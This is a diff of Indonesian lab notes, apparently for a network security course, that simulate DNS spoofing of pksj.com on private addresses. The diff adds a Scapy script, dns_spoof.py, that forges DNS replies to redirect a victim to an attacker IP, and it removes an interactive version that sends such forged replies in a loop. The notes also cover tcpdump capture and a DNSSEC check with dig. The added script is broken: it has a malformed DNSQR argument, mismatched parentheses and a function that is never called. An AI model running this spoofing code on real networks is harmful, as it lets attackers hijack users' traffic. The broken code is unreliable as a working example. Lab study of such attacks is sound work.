@@ -3,22 +3,27 @@ Melakukan simulasi serangan DNS spoofing menggunakan IP yang ada didalam db.pksj
 (untuk menginstall tiga alat penting yang yang bia digunakan untuk fungsi terkait DNS)
 sudo apt update
 sudo apt install dnsutils tcpdump scapy
+sudo nano dns_spoof.py (membuat file yang berisi script palsu)
+ISI DALAM SCRIPT{
+from scapy.all import *
+
+victim_ip = "192.168.1.12"
+dns_server_ip = "192.168.1.1"
+spoofed_ip = "192.168.1.200"
+domain = "pksj.com"
+
+def dns_spoof():
+  spoofed_packet = IP(src=dns_server_ip, dst=victim_ip) / \
+                   UDP(sport=53, dport=33333) / \
+                   DNS(id=0xAAAA, qr=1, aa=1, qd=DNSQR=domain),
+                    an=DNSRR(rrname=domain, ttl=10, rdata=spoofed_ip))
+  send(spoofed_packet)
+dns_spoof
+}
+sudo python3 dns_spoof.py
+
 ip a (untuk pengecekan nama antarmuka sistem)
 sudo tcpdump -i enp0s3 port 53 -vv (menangkap lalu lintas DNS)
-sudo phython3 (memanipulasi jaringan)
-(masukkan skrip untuk melakukan serangan DNS spoofing)
->>> from scapy.all import *
-t>>>
->>> target_ip = "192.168.1.125"
->>> dns_server = "192.168.1.1"
->>> spoofed_ip = "192.168.1.32"
->>> domain = "pksj.com"
->>>
->>> dns_response = IP(src=dns_server, dst=target_ip)/\
-... UDP (sport=53, dport=RandShort())/\
-... DNS(id=RandShort(), qr=1, aa=1, qd=DNSQR(qname=domain), an=DNSRR(rrname=domain, rdata=spoofed_ip))
->>>
->>> send(dns_response, loop=1, verbose=1)
 
 (melakukan pengujian respon server DNS dengan DNSSEC aktif)
 dig +dnssec pksj.com
